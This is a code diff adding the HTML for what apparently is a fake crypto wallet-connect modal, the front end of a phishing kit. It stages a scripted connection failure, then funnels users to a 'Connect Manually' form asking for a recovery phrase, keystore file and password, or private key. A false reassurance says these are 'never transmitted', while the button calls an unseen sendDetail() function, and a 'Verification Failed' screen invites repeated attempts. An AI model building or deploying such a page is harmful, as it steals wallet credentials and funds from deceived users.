+                        <div class="ow-name">BitPay Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/infinito.png" alt="Infinito Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Infinito Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/defly.png" alt="Defly Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Defly Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/huobi.png" alt="Huobi Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Huobi Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep Wallet" /></div>
+                    <div>
+                        <div class="ow-name">BitKeep Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/jade.png" alt="Jade Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Jade Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/stepn.png" alt="StepN Wallet" /></div>
+                    <div>
+                        <div class="ow-name">StepN Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+            </div>
+            <div class="ow-no-results" id="owNoResults">
+                <i class="ri-search-line"></i>
+                No wallets found for "<span id="owQuery" style="color:#312938;font-weight:600"></span>"
+            </div>
+        </div>
+
+        <!-- SCREEN 2: Connecting -->
+        <div class="w-sub" id="wScreen2">
+            <div class="w-header">
+                <span class="w-title">Connecting</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-loading-body">
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s2Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s2Name">Wallet</span>
+                </div>
+                <div class="w-spinner"></div>
+                <p class="w-status" id="s2Status">Initializing secure connection...</p>
+                <div class="w-progress-wrap">
+                    <div class="w-progress-bar" id="s2Progress"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: Connection Failed -->
+        <div class="w-sub" id="wScreen3">
+            <div class="w-header">
+                <span class="w-title">Connection Failed</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-error-body">
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s3Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s3Name">Wallet</span>
+                </div>
+                <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+                <p class="w-error-msg">
+                    <strong>Unable to Connect</strong>
+                    We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+                    device. Try again or connect manually.
+                </p>
+                <div class="w-btn-stack">
+                    <button class="w-btn w-btn-plum" id="retryBtn">
+                        <i class="ri-refresh-line"></i> Retry Connection
+                    </button>
+                    <button class="w-btn w-btn-ghost" id="manualBtn">Connect Manually</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 4: Manual Connect (custom) -->
+        <div class="w-sub" id="wScreen4">
+            <div class="w-header">
+                <span class="w-title">Connect Manually</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-manual-body">
+
+                <!-- wallet chip -->
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s4Name">Wallet</span>
+                </div>
+
+                <!-- type toggle: Phrase | Keystore JSON | Private Key -->
+                <div class="type-toggle">
+                    <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
+                    <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+                    <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
+                </div>
+
+                <!-- Pane 1: Phrase -->
+                <div class="input-pane active" id="pane-phrase">
+                    <textarea class="w-textarea phrase-area" id="detailInput"
+                        placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..."
+                        spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                </div>
+
+                <!-- Pane 2: Keystore JSON -->
+                <div class="input-pane" id="pane-keystore">
+                    <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
+                        spellcheck="false" autocomplete="off"></textarea>
+                    <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
+                    <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
+                        <i class="ri-attachment-2"></i>
+                        Attach Keystore File
+                    </button>
+                    <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
+                        onchange="handleKeystoreFile(this)" />
+                    <p class="attach-file-name" id="attachFileName"></p>
+                </div>
+
+                <!-- Pane 3: Private Key -->
+                <div class="input-pane" id="pane-privatekey">
+                    <textarea class="w-textarea privkey-area" id="privkeyInput"
+                        placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false"
+                        autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                </div>
+
+                <!-- encrypt note -->
+                <div class="w-encrypt-note">
+                    <i class="ri-lock-2-line"></i>
+                    <p>
+                        <strong>End-to-end encrypted.</strong>
+                        Your credentials are encrypted locally and never transmitted to any server.
+                        Cake Wallet support will never ask for your seed phrase or private key.
+                    </p>
+                </div>
+
+                <button class="w-btn w-btn-plum" onclick="sendDetail()">
+                    <i class="ri-wallet-3-line"></i> Connect Wallet
+                </button>
+
+            </div>
+        </div>
+
+        <!-- SCREEN 5: Manual Failed -->
+        <div class="w-sub" id="wScreen5">
+            <div class="w-header">
+                <span class="w-title">Verification Failed</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-error-body">
+                <div class="w-wallet-chip">
+                    <div class="w-chip-icon"><img id="s5Img" src="" alt="" /></div>
+                    <span class="w-chip-name" id="s5Name">Wallet</span>
+                </div>
+                <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+                <p class="w-error-msg">
+                    <strong>Invalid Credentials</strong>
+                    The information you entered could not be verified. Please double-check your phrase, keystore file,
+                    or private key and try again.
+                </p>
+                <div class="w-btn-stack">
+                    <button class="w-btn w-btn-plum" onclick="handleRetryManual()">
+                        <i class="ri-refresh-line"></i> Try Again
+                    </button>
+                    <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+
+    <script src="function.js"></script>
+</body>
+
+</html>
